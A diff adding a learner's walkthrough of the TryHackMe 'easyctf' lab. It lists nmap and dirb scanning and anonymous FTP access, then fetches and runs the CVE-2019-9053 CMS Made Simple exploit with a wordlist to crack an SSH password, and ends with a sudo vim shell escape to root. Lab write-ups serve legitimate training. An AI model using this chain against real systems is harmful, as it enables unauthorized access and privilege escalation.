@@ -1,0 +1,63 @@
+All steps and concepts about CTF made on https://tryhackme.com/room/easyctf:
+
+1 - Start Machine on tryhackme 
+
+2 - Connect on VPN (download configuration file and connect via terminal)
+
+3 - Ping IP to check if is connected
+
+4 - PortScaning with 'nmap' command (check all ports ther are on server)
+
+    sudo nmap -sV -A 10.10.193.189 (return softwares version and ports used)
+
+5 - The PortScaning return ftp services is open anonymous, connect it
+
+    ftp 10.10.193.189 / user anonymous
+
+6 - Use dirb to list all path the server can have
+
+    dirb http://10.10.193.189
+
+7 - The http://10.10.193.189 is a server for a apache, and contain a site on /simple
+    It's a "CMS Made Simple"
+
+7 - Concept 'Exploit' - vunerabilitys documented and step-by-step to how hack anything , just seach for
+
+    https://exploit-db.com
+
+8 - Seach for CMS Made Simple and get the CVE - code vunerability on exploit-db 
+
+    cve-2019-9053
+    https://www.exploit-db.com/exploits/46635
+
+9 - Copy the script and run on VirtualHost - Kali Linux
+
+    wget https://www.exploit-db.com/raw/46635
+
+10 - mv this file to a .py format and change permission 'chmod +x 46635.py'
+
+11 - Observation: Kali Linux has a dicionary list on /usr/share/wordlists
+
+    gunzip rockyou.txt.gz 
+
+12 - Execute the .py file
+
+    python 46635.py -u http://10.10.193.189/simple/ --crak -w /usr/share/wordlists/rockyou.txt 
+
+13 - This returns password 'secret'
+
+14 - It can be used to login on ssh 
+
+    ssh mitch@10.10.193.189 -p 2222
+
+15 - Check the executables softwares can user have 
+ 
+    sudo -l
+
+    (return vim)
+
+16 - Execute it with privileges
+
+    sudo vim -c ':!/bin/sh'
+
+17 - Like root with 'whoami', get the user flag
